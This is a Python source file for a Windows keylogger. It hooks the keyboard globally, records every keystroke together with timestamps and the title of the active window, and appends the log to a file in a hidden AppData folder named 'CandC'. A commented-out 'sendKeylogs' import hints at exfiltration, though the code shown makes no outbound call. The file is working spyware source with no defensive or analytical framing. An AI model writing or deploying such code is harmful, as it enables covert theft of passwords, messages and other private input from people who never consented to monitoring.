import os
import pyHook
import threading
import win32api
import win32gui
import datetime
import pythoncom
import ctypes
# import sendKeylogs

# count_scr = 0
# count_letter = 0
# count_scremail = 0
# check_count = 1234
buffer = ''
window = ''
save_keystroke = None
current_active_window = ''
current_system_time = datetime.datetime.now()

SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
USERDATA_PATH = SAVE_FILES + "\\User Data\\"

class Keylogger:

    def __init__(self):
        pass

    def OnKeyboardEvent(self,event):
        # global count_letter
        # global count_scr
        # global buffer
        global buffer
        global window
        global save_keystroke
        global current_active_window

        save_keystroke = open(USERDATA_PATH + "keylog111.txt", 'a')

        new_active_window = current_active_window
        current_active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())

        if new_active_window != current_active_window:
            window = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + current_active_window
            save_keystroke.write(str(window)+'\n')
            window = ''

        if event.Ascii == 13:
            buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + buffer
            save_keystroke.write(buffer+ '\n')
            buffer = ''
            # count_letter = count_letter + 1
            # count_scr = count_scr + 1
        
        elif event.Ascii == 8:
            buffer = buffer[:-1]
            # count_letter = count_letter + 1
            # count_scr = count_scr + 1
        
        elif event.Ascii == 9:
            keys = '\t'
            buffer = buffer + keys
            # count_letter = count_letter + 1
            # count_scr = count_scr + 1
        
        elif event.Ascii >= 32 and event.Ascii <= 127:
            keys = chr(event.Ascii)
            buffer = buffer + keys
            # count_letter = count_letter + 1
            # count_scr = count_scr + 1
            
            
        return True


def hookslaunch():
    print('[*] Starting keylogger')
    a = Keylogger()
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = a.OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()